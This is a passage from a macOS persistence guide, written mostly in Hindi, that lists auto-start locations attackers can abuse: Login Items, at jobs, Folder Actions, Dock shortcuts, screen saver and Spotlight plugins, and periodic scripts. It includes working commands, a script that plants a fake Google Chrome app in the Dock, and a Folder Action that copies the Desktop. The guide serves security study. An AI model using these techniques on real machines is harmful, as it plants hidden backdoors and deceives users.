> [!CAUTION]
> ssh को चालू करने के लिए Full Disk Access की आवश्यकता होती है:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### विवरण & Exploitation

डिफ़ॉल्ट रूप से, जब तक `/etc/ssh/sshd_config` में `PermitUserRC no` सेट न हो, जब कोई user **SSH के माध्यम से लॉगिन** करता है तो स्क्रिप्ट्स **`/etc/ssh/sshrc`** और **`~/.ssh/rc`** execute की जाएँगी।

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- sandbox को bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- लेकिन आपको `osascript` को args के साथ चलाना होगा
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Login
- Exploit payload stored calling **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Login
- Root required

#### विवरण

System Preferences -> Users & Groups -> **Login Items** में आप वे **items** पा सकते हैं जो user के login होने पर execute होते हैं।\
यह संभव है कि इन्हें command line से list, add और remove किया जा सके:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
These items are stored in the file **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Login items** can **also** be indicated in using the API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) which will store the configuration in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP as Login Item

(Check previous section about Login Items, this is an extension)

यदि आप एक **ZIP** फाइल को **Login Item** के रूप में स्टोर करते हैं तो **`Archive Utility`** उसे खोलेगा और यदि zip उदाहरण के लिए **`~/Library`** में स्टोर था और उसमें फ़ोल्डर **`LaunchAgents/file.plist`** मौजूद था जिसमें एक backdoor था, तो वह फ़ोल्डर बनाया जाएगा (यह डिफ़ॉल्ट रूप से मौजूद नहीं होता) और plist जोड़ दिया जाएगा ताकि अगली बार जब उपयोगकर्ता लॉग इन करे, तो **plist में संकेतित backdoor निष्पादित हो जाएगा**।

एक अन्य विकल्प होगा उपयोगकर्ता HOME के अंदर फ़ाइलें **`.bash_profile`** और **`.zshenv`** बनाना, ताकि अगर LaunchAgents फ़ोल्डर पहले से मौजूद हो तो यह तकनीक फिर भी काम करेगी।

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Sandbox को bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- लेकिन आपको **`at`** को **चलाना** होगा और यह **सक्रिय** होना चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`at`** को **चलाना** होगा और यह **सक्रिय** होना चाहिए

#### **विवरण**

`at` टास्क विशेष समय पर निष्पादित होने के लिए **एक-बार के टास्क की शेड्यूलिंग** के लिए डिज़ाइन किए गए हैं। cron jobs के विपरीत, `at` टास्क निष्पादन के बाद स्वचालित रूप से हटा दिए जाते हैं। यह ध्यान रखना महत्वपूर्ण है कि ये टास्क सिस्टम रिबूट के बाद भी बनी रहती हैं, जो कुछ परिस्थितियों में संभावित सुरक्षा चिंताएँ पैदा कर सकती हैं।

डिफ़ॉल्ट रूप से ये **निष्क्रिय** होते हैं, लेकिन **root** उपयोगकर्ता इन्हें **सक्षम** कर सकता है:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
यह 1 घंटे में एक फ़ाइल बनाएगा:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
जॉब कतार की जाँच `atq` का उपयोग करके करें:
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
ऊपर हम दो शेड्यूल किए गए जॉब देख सकते हैं। हम `at -c JOBNUMBER` का उपयोग करके जॉब का विवरण प्रिंट कर सकते हैं।
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> यदि AT tasks सक्षम नहीं हैं तो बनाए गए tasks निष्पादित नहीं होंगे।

ये **job फ़ाइलें** `/private/var/at/jobs/` में पाई जा सकती हैं।
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
The filename contains the queue, the job number, and the time it’s scheduled to run. For example, आइए `a0001a019bdcd2` को देखें।

- `a` - यह queue है
- `0001a` - job number in hex, `0x1a = 26`
- `019bdcd2` - time in hex. यह epoch के बाद से बीते मिनट्स को दर्शाता है। `0x019bdcd2` दशमलव में `26991826` है। अगर हम इसे 60 से गुणा करते हैं तो हमें `1619509560` मिलता है, जो `GMT: 2021. April 27., Tuesday 7:46:00` है।

यदि हम job फ़ाइल को प्रिंट करते हैं, तो हमें वह समान जानकारी मिलती है जो हमने `at -c` का उपयोग करके प्राप्त की थी।

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Sandbox को बाइपास करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- लेकिन आपको `osascript` को arguments के साथ कॉल करने में सक्षम होना चाहिए ताकि **`System Events`** से संपर्क करके Folder Actions को कॉन्फ़िगर किया जा सके
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- इसके पास Desktop, Documents और Downloads जैसी कुछ बुनियादी TCC अनुमतियाँ हैं

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- रूट आवश्यकता
- **Trigger**: निर्दिष्ट फ़ोल्डर तक पहुँच
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: निर्दिष्ट फ़ोल्डर तक पहुँच

#### विवरण और शोषण

Folder Actions वे स्क्रिप्ट हैं जो फ़ोल्डर में होने वाले परिवर्तनों पर स्वचालित रूप से ट्रिगर होती हैं, जैसे वस्तुएँ जोड़ना, हटाना, या अन्य क्रियाएँ जैसे फ़ोल्डर विंडो खोलना या उसका आकार बदलना। इन क्रियाओं का उपयोग विभिन्न कार्यों के लिए किया जा सकता है, और इन्हें Finder UI या टर्मिनल कमांड जैसी अलग-अलग तरीकों से ट्रिगर किया जा सकता है।

Folder Actions सेटअप करने के लिए, आपके पास विकल्प हैं:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) के साथ एक Folder Action workflow बनाकर इसे एक सेवा के रूप में इंस्टॉल करना।
2. किसी फ़ोल्डर के context menu में Folder Actions Setup के माध्यम से मैन्युअल रूप से एक स्क्रिप्ट संलग्न करना।
3. OSAScript का उपयोग करके Apple Event संदेश `System Events.app` को भेजकर प्रोग्रामेटिक रूप से एक Folder Action सेटअप करना।
- यह विधि सिस्टम में action को एम्बेड करने के लिए विशेष रूप से उपयोगी है, जो एक स्तर का स्थायित्व प्रदान करती है।

निम्नलिखित स्क्रिप्ट एक उदाहरण है जो Folder Action द्वारा निष्पादित की जा सकती है:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
उपरोक्त स्क्रिप्ट को Folder Actions द्वारा उपयोग योग्य बनाने के लिए, इसे संकलित करें:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
स्क्रिप्ट कम्पाइल हो जाने के बाद, नीचे दी गई स्क्रिप्ट चलाकर Folder Actions सेट अप करें। यह स्क्रिप्ट Folder Actions को सिस्टम-व्यापी रूप से सक्षम करेगी और विशेष रूप से पहले कम्पाइल की गई स्क्रिप्ट को Desktop फ़ोल्डर के साथ संलग्न करेगी।
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
सेटअप स्क्रिप्ट को निम्न के साथ चलाएँ:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- यह GUI के माध्यम से इस persistence को लागू करने का तरीका है:

यह वह script है जिसे चलाया जाएगा:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
इसे Compile करने के लिए: `osacompile -l JavaScript -o folder.scpt source.js`

इसे स्थानांतरित करें:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
फिर, `Folder Actions Setup` app खोलें, उस **फ़ोल्डर को चुनें जिसे आप देखना चाहते हैं** और अपने मामले में **`folder.scpt`** चुनें (मेरे मामले में मैंने इसका नाम output2.scp रखा था):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

अब, यदि आप उस फ़ोल्डर को **Finder** से खोलते हैं, तो आपकी स्क्रिप्ट निष्पादित हो जाएगी।

यह कॉन्फ़िगरेशन base64 फ़ॉर्मेट में **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** में संग्रहीत था।

अब, GUI एक्सेस के बिना इस persistence को तैयार करने की कोशिश करते हैं:

1. **Copy `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** को बैकअप के लिए `/tmp` में कॉपी करें:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Remove**: आपने अभी जो Folder Actions सेट किए थे उन्हें हटाएँ:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

अब जब हमारे पास एक खाली environment है

3. बैकअप फाइल को कॉपी करें: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. इस कॉन्फ़िग को लोड करने के लिए Folder Actions Setup.app खोलें: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> और यह मेरे लिए काम नहीं किया, लेकिन ये writeup के निर्देश हैं:(

### Dock शॉर्टकट

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- लेकिन आपको सिस्टम के अंदर एक malicious application स्थापित होना चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: जब उपयोगकर्ता Dock के अंदर ऐप पर क्लिक करता है

#### विवरण & Exploitation

Dock में दिखाई देने वाली सभी एप्लिकेशन **`~/Library/Preferences/com.apple.dock.plist`** के अंदर निर्दिष्ट हैं।

यह संभव है कि आप बस निम्न के साथ एक **application जोड़** सकें:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
कुछ **social engineering** का इस्तेमाल करके आप डॉक के अंदर **impersonate for example Google Chrome** कर सकते हैं और वास्तव में अपना script चला सकते हैं:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- बहुत ही विशिष्ट कार्रवाई होना आवश्यक है
- आप एक अन्य sandbox में समाप्त होंगे
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/Library/ColorPickers`
- Root आवश्यक है
- Trigger: Use the color picker
- `~/Library/ColorPickers`
- Trigger: Use the color picker

#### विवरण & Exploit

**Compile a color picker** bundle अपने code के साथ बनाएं (आप [**this one for example**](https://github.com/viktorstrate/color-picker-plus) का उपयोग कर सकते हैं) और एक constructor जोड़ें (जैसा कि [Screen Saver section](macos-auto-start-locations.md#screen-saver) में) और bundle को `~/Library/ColorPickers` में कॉपी करें।

फिर, जब color picker ट्रिगर होगा तो आपका code भी चल जाएगा।

ध्यान दें कि आपकी library को load करने वाला binary एक **very restrictive sandbox** में चलता है: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Sandbox को बायपास करने के लिए उपयोगी: **नहीं, क्योंकि आपको अपना खुद का app चलाना होगा**
- TCC bypass: ???

#### स्थान

- एक विशिष्ट app

#### विवरण & Exploit

Finder Sync Extension के साथ एक application का उदाहरण [**can be found here**](https://github.com/D00MFist/InSync).

Applications में `Finder Sync Extensions` हो सकते हैं। यह extension उस application के अंदर जाएगा जिसे execute किया जाएगा। इसके अलावा, extension को अपना कोड execute करने के लिए इसे कुछ मान्य Apple developer certificate के साथ **हस्ताक्षरित होना चाहिए**, इसे **sandboxed** होना चाहिए (हालाँकि relaxed exceptions जोड़े जा सकते हैं) और इसे कुछ इस तरह से registered किया जाना चाहिए:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

लेख: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
लेख: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- sandbox को bypass करने में उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
- लेकिन आप एक सामान्य application sandbox में समाप्त होंगे
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- `/System/Library/Screen Savers`
- Root required
- **Trigger**: Screen Saver का चयन करें
- `/Library/Screen Savers`
- Root required
- **Trigger**: Screen Saver का चयन करें
- `~/Library/Screen Savers`
- **Trigger**: Screen Saver का चयन करें

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### विवरण & Exploit

Xcode में एक नया प्रोजेक्ट बनाएं और नया **Screen Saver** generate करने के लिए टेम्पलेट चुनें। फिर, अपना code इसमें जोड़ें — उदाहरण के लिए logs जनरेट करने के लिए निम्न कोड।

**Build** करें, और `.saver` bundle को **`~/Library/Screen Savers`** में कॉपी करें। फिर, Screen Saver GUI खोलें और उस पर क्लिक करने पर यह बहुत सारे logs जनरेट करेगा:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> ध्यान दें कि इस कोड को लोड करने वाली बाइनरी के entitlements के अंदर (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) आप **`com.apple.security.app-sandbox`** पा सकते हैं, इसलिए आप **सामान्य एप्लिकेशन सैंडबॉक्स के अंदर** होंगे। 

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- उपयोगी to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- लेकिन आप application sandbox में समाप्त होंगे
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- sandbox बहुत सीमित दिखता है

#### Location

- `~/Library/Spotlight/`
- **Trigger**: एक नया फ़ाइल उस extension के साथ जो Spotlight plugin द्वारा managed है बनाया जाता है।
- `/Library/Spotlight/`
- **Trigger**: एक नया फ़ाइल उस extension के साथ जो Spotlight plugin द्वारा managed है बनाया जाता है।
- Root required
- `/System/Library/Spotlight/`
- **Trigger**: एक नया फ़ाइल उस extension के साथ जो Spotlight plugin द्वारा managed है बनाया जाता है।
- Root required
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: एक नया फ़ाइल उस extension के साथ जो Spotlight plugin द्वारा managed है बनाया जाता है।
- New app required

#### Description & Exploitation

Spotlight macOS का built-in search feature है, जो उपयोगकर्ताओं को उनके कंप्यूटर्स पर डेटा तक **तेज़ और व्यापक पहुँच** देने के लिए डिज़ाइन किया गया है।\
इस तेज़ खोज क्षमता को सक्षम करने के लिए, Spotlight एक **proprietary database** बनाए रखता है और अधिकांश फ़ाइलों को **parsing** करके एक index बनाता है, जिससे फ़ाइल नामों और उनकी सामग्री दोनों में तेज़ खोज संभव होती है।

Spotlight के पीछे का तंत्र एक केंद्रीय प्रक्रिया 'mds' पर निर्भर करता है, जिसका अर्थ है **'metadata server'।** यह प्रक्रिया पूरे Spotlight सर्विस का आयोजन करती है। इसके साथ-साथ कई 'mdworker' daemons भी होते हैं जो विभिन्न रखरखाव कार्य करते हैं, जैसे कि अलग-अलग फ़ाइल प्रकारों का indexing (`ps -ef | grep mdworker`)। ये कार्य Spotlight importer plugins, या **".mdimporter bundles"** के माध्यम से संभव होते हैं, जो Spotlight को विभिन्न फ़ाइल फॉर्मैट्स की सामग्री को समझने और index करने में सक्षम बनाते हैं।

उपरोक्त स्थानों में plugins या **`.mdimporter`** bundles स्थित होते हैं और यदि कोई नया bundle प्रकट होता है तो वह कुछ ही मिनटों में लोड हो जाता है (किसी सेवा को restart करने की ज़रूरत नहीं)। इन bundles को यह संकेत करने की ज़रूरत होती है कि वे कौन से **file type और extensions** संभाल सकते हैं; इस तरह, जब किसी संकेतित extension के साथ कोई नई फ़ाइल बनाई जाती है तो Spotlight उनका उपयोग करेगा।

यह संभव है कि चल रहे सभी **`mdimporters`** को खोजा जाए:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
और उदाहरण के लिए **/Library/Spotlight/iBooksAuthor.mdimporter** का उपयोग इन प्रकार की फ़ाइलों (एक्सटेंशन `.iba` और `.book` सहित) को पार्स करने के लिए किया जाता है:
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> यदि आप अन्य `mdimporter` का Plist देखें तो आपको एंट्री **`UTTypeConformsTo`** नहीं मिल सकती। ऐसा इसलिए है क्योंकि वह एक built-in _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) है और उसे extensions निर्दिष्ट करने की आवश्यकता नहीं होती।
>
> इसके अलावा, System default plugins हमेशा प्राथमिकता लेते हैं, इसलिए एक attacker केवल उन फाइलों तक पहुँच सकता है जिन्हें Apple के अपने `mdimporters` द्वारा पहले से index नहीं किया गया होता।

To create your own importer you could start with this project: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) and then change the name, the **`CFBundleDocumentTypes`** and add **`UTImportedTypeDeclarations`** so it supports the extension you would like to support and refelc them in **`schema.xml`**.\
Then **change** the code of the function **`GetMetadataForFile`** to execute your payload when a file with the processed extension is created.

Finally **build and copy your new `.mdimporter`** to one of thre previous locations and you can chech whenever it's loaded **monitoring the logs** or checking **`mdimport -L.`**

### ~~Preference Pane~~

> [!CAUTION]
> ऐसा लगता है कि यह अब काम नहीं कर रहा है।

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- sandbox bypass के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
- इसके लिए किसी विशिष्ट उपयोगकर्ता क्रिया की आवश्यकता होती है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

ऐसा लगता है कि यह अब काम नहीं कर रहा है।

## Root Sandbox Bypass

> [!TIP]
> यहाँ आप ऐसे start locations पा सकते हैं जो **sandbox bypass** के लिए उपयोगी हैं और जो आपको सरलता से कुछ execute करने की अनुमति देते हैं बस उसे किसी फाइल में **writing it into a file** करके जब आप **root** हों और/या अन्य **weird conditions** आवश्यक हों।

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- sandbox bypass के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
- परंतु आपको **root** होना होगा
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root required
- **Trigger**: When the time comes
- `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local`
- Root required
- **Trigger**: When the time comes

#### Description & Exploitation

The periodic scripts (**`/etc/periodic`**) are executed because of the **launch daemons** configured in `/System/Library/LaunchDaemons/com.apple.periodic*`. ध्यान दें कि `/etc/periodic/` में रखे गए scripts को फ़ाइल के **owner** के रूप में **executed** किया जाता है, इसलिए यह किसी potential **privilege escalation** के लिए काम नहीं करेगा।
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
अन्य periodic स्क्रिप्ट्स भी हैं जिन्हें **`/etc/defaults/periodic.conf`** में निर्दिष्ट किया गया है और जो निष्पादित होंगी:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
If you manage to write any of the files `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local` it will be **executed sooner or later**.

> [!WARNING]
> ध्यान दें कि periodic script को **स्क्रिप्ट के मालिक के रूप में निष्पादित किया जाएगा**। इसलिए अगर किसी सामान्य user के पास स्क्रिप्ट का स्वामित्व है, तो यह उसी user के रूप में निष्पादित होगी (this might prevent privilege escalation attacks).

### PAM

लिखित विवरण: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
लिखित विवरण: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- sandbox को बायपास करने में उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
- लेकिन आपको root होना चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- root हमेशा आवश्यक

#### विवरण और शोषण

